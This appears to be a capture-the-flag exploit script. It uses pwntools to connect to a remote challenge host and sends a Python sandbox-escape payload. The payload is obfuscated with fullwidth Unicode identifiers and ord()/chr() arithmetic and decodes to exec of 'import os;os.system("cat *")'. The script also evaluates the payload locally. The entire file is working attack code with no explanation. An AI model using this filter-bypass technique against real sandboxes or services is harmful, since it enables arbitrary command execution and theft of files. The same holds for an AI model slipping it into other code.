from pwn import *

r = remote('eof01.zoolab.org', 2222)

# import os;os.system()

one = '(ｏｒｄ(\'#\')^ｏｒｄ(\'$\'))'

p = 'ｅｘｅｃ('
p += 'ｃｈｒ(ｏｒｄ(\')\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'-\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'$\')+ｏｒｄ(\'&\')+ｏｒｄ(\'&\'))'
p += '+ｃｈｒ(ｏｒｄ(\'/\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'&\')+ｏｒｄ(\'&\')+ｏｒｄ(\'&\'))'
p += '+ｃｈｒ(ｏｒｄ(\'&\')+ｏｒｄ(\'&\')+ｏｒｄ(\'(\'))'

p += '+ｃｈｒ(ｏｒｄ(\'@\')^ｏｒｄ(\'`\'))'

p += '+ｃｈｒ(ｏｒｄ(\'/\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'%\')+ｏｒｄ(\'%\')+ｏｒｄ(\')\'))'

p += '+\';\''

p += '+ｃｈｒ(ｏｒｄ(\'/\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'%\')+ｏｒｄ(\'%\')+ｏｒｄ(\')\'))'

p += '+\'.\''

p += '+ｃｈｒ(ｏｒｄ(\'%\')+ｏｒｄ(\'%\')+ｏｒｄ(\')\'))'
p += '+ｃｈｒ(ｏｒｄ(\'(\')+ｏｒｄ(\'(\')+ｏｒｄ(\')\'))'
p += '+ｃｈｒ(ｏｒｄ(\'%\')+ｏｒｄ(\'%\')+ｏｒｄ(\')\'))'
p += '+ｃｈｒ(ｏｒｄ(\'&\')+ｏｒｄ(\'&\')+ｏｒｄ(\'(\'))'
p += '+ｃｈｒ(ｏｒｄ(\'%\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'-\')|ｏｒｄ(\'`\'))'

p += '+\'("\''


p += '+ｃｈｒ(ｏｒｄ(\'#\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'!\')|ｏｒｄ(\'`\'))'
p += '+ｃｈｒ(ｏｒｄ(\'&\')+ｏｒｄ(\'&\')+ｏｒｄ(\'(\'))'
p += '+ｃｈｒ(ｏｒｄ(\'@\')^ｏｒｄ(\'`\'))'
p += '+\'*\''
#p += '+ｃｈｒ(ｏｒｄ(\',\')|ｏｒｄ(\'`\'))' # l
#p += '+ｃｈｒ(ｏｒｄ(\'%\')+ｏｒｄ(\'%\')+ｏｒｄ(\')\'))' # s
#p += '+\' -\''

p += '+\'")\''

p += ')'
print(p)
eval(p)

r.sendline(p)
r.interactive()
